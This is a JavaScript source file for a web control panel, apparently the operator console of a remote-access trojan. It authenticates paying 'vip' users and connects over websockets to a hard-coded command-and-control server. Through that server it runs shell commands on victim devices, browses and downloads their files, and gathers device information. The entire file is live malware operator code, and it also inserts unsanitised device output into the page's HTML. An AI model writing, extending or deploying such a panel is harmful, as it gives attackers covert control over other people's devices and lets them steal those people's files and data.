import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

const app = initializeApp(window.firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const $ = id => document.getElementById(id);

const C2_SERVER_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") 
  ? "http://localhost:8080" 
  : "https://sectkur-c2.up.railway.app";

let socket = null;
let currentAppuid = null;

document.getElementById("sidebar-toggle").addEventListener("click", () => {
  const sidebar = document.getElementById("sidebar");
  if (window.innerWidth <= 768) { sidebar.classList.toggle("open"); } 
  else { sidebar.classList.toggle("collapsed"); }
});

$("nav-logout").addEventListener("click", async e => { e.preventDefault(); await signOut(auth); window.location.href = "/login"; });

function showToast(msg, type = "info") {
  const t = $("toast"); t.textContent = msg; t.className = "toast show " + type;
  setTimeout(() => t.className = "toast", 3000);
}

function switchTab(tabId) {
  ['shell', 'file', 'screen', 'info'].forEach(t => $(`tab-${t}`).classList.add("hidden"));
  $(`tab-${tabId}`).classList.remove("hidden");
}
window.switchTab = switchTab;

showLoader("VERIFIKASI AKSES...");
showLoader("VERIFIKASI AKSES...");
onAuthStateChanged(auth, async (user) => {
  if (!user) { window.location.href = "/login"; return; }
  const snap = await getDoc(doc(db, "users", user.uid));
  if (!snap.exists() || (snap.data().role !== "vip" && snap.data().role !== "developer")) {
    showToast("Akses ditolak.", "error");
    setTimeout(() => window.location.href = "/dashboard", 2000);
    return;
  }
  currentAppuid = user.uid;
  $("c2-appuid").textContent = currentAppuid;
  initSocket();
});

function initSocket() {
  showLoader("MENGHUBUNGKAN KE C2 SERVER...");
  showLoader("MENGHUBUNGKAN KE C2 SERVER...");
  if (socket) socket.disconnect();
  $("device-status").textContent = "CONNECTING...";
  $("device-status").className = "role-badge trial";

  try {
    socket = io(C2_SERVER_URL, { transports: ["websocket"] });
    socket.on("connect", () => {
      hideLoader();
      hideLoader(); socket.emit("register_panel", { appuid: currentAppuid }); });
    socket.on("device_status", (data) => {
      if (data.online) {
        $("device-status").textContent = "ONLINE";
        $("device-status").className = "role-badge vip";
        appendTerm(`\n[+] Device terhubung!\n`);
        getDeviceInfo();
      } else {
        $("device-status").textContent = "OFFLINE";
        $("device-status").className = "role-badge expired";
        appendTerm(`\n[-] Device terputus.\n`);
      }
    });

    socket.on("command_output", (data) => {
      if (data.type === "shell") appendTerm(data.output);
      else if (data.type === "file_list") renderFiles(data.files);
      else if (data.type === "device_info") renderDeviceInfo(data.info);
      else if (data.type === "error") appendTerm(`<span style="color:red;">[Error] ${data.output}</span>`);
    });
  } catch (err) { console.error(err); }
}

function appendTerm(text) {
  const term = $("term-output");
  term.innerHTML += `<div>${text}</div>`;
  term.scrollTop = term.scrollHeight;
}

window.sendShellCmd = function() {
  const cmd = $("term-input").value.trim();
  if (!cmd) return;
  appendTerm(`<span style="color:white;">$ ${cmd}</span>`);
  $("term-input").value = "";
  if (socket && socket.connected) socket.emit("send_command", { appuid: currentAppuid, command: "shell", args: cmd });
};

window.listFiles = function() {
  const path = $("file-path").value.trim();
  if (socket && socket.connected) socket.emit("send_command", { appuid: currentAppuid, command: "list_files", args: path });
};

window.getDeviceInfo = function() {
  if (socket && socket.connected) socket.emit("send_command", { appuid: currentAppuid, command: "device_info", args: "" });
};

function renderFiles(files) {
  const tbody = $("file-tbody");
  if (!files || files.length === 0) {
    tbody.innerHTML = `<tr><td colspan="3" class="text-center text-dim">Kosong.</td></tr>`;
    return;
  }
  tbody.innerHTML = "";
  files.forEach(f => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${f.name}</td>
      <td>${f.isDir ? "Folder" : "File"}</td>
      <td>${f.isDir ? `<button class="action-btn" onclick="openFolder('${f.path}')">Buka</button>` : `<button class="action-btn gold" onclick="downloadFile('${f.path}')">Download</button>`}</td>
    `;
    tbody.appendChild(tr);
  });
}

window.openFolder = function(path) {
  $("file-path").value = path;
  listFiles();
};

window.downloadFile = function(path) {
  if (socket && socket.connected) socket.emit("send_command", { appuid: currentAppuid, command: "read_file", args: path });
};

function renderDeviceInfo(info) {
  const out = $("info-output");
  out.innerHTML = "";
  for (const [key, value] of Object.entries(info)) {
    out.innerHTML += `<div><span style="color:var(--blood);">${key}:</span> ${value}</div>`;
  }
}
